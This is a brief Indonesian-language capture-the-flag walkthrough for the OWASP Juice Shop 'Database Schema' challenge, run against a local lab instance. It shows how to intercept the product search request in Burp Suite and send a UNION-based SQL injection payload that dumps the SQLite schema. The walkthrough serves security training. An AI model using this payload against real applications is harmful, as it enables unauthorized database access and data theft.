# Database Schema

## Resource Belajar
https://www.invicti.com/blog/web-security/sql-injection-cheat-sheet/

## Step by step
1. Juice shop menggunakan endpoint tertentu untuk dapat mencari suatu produk, contohnya dengan endpoint ini ``http://localhost:3000/#/rest/products/search?q=apple%20juice``.
   <img width="1439" height="856" alt="image" src="https://github.com/user-attachments/assets/e8a87372-8d69-4b0a-8070-b530a2f1da76" />
   
 2. Endpoint tadi adalah kerentanan yang fatal dan dapat dieksploitasi, anda bisa coba burpsuite untuk intercept dan lakukan send to repeater.
 <img width="1439" height="856" alt="image" src="https://github.com/user-attachments/assets/2d3ebe48-a7eb-4cad-bd95-b78186a732c2" />

 3. Anda bisa coba dengan payload sederhana seperti ini pada repeater request ``test')) UNION SELECT 1,2,3,4,5,6,7,8,sql FROM sqlite_schema--``
 <img width="1439" height="856" alt="image" src="https://github.com/user-attachments/assets/6046048c-89da-4bb5-8d9d-d64b1f8ba960" />
 
 4. Ini adalah respon dari repeater yang kita kirim tadi.
<img width="1439" height="856" alt="image" src="https://github.com/user-attachments/assets/6aa02f0e-c728-4836-bfe6-f4261c07dd6a" />

5. Challenge berhasil diselesaikan.
 <img width="1439" height="856" alt="image" src="https://github.com/user-attachments/assets/23f7cdd5-fb19-426d-822c-81b7639c97fa" />
